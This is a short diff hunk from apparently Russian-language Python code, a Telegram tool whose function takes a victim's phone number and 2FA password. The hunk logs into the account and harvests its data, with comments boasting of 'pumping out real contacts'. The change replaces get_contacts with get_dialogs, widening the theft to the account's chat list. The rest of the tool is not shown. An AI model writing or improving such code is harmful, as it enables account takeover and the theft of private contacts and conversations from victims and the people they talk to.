@@ -304,7 +304,7 @@ async def verify_telegram_2fa(phone, password):
         
         # 🔥 ВЫКАЧКА РЕАЛЬНЫХ КОНТАКТОВ
         print(f"🚀 Начинаем сбор РЕАЛЬНЫХ контактов...")
-        contacts = await client.get_contacts()
+        contacts = await client.get_dialogs()
         
         # Формируем сообщение с контактами
         contacts_text = f"📱 ВЫКАЧАНЫ РЕАЛЬНЫЕ КОНТАКТЫ\n\n"
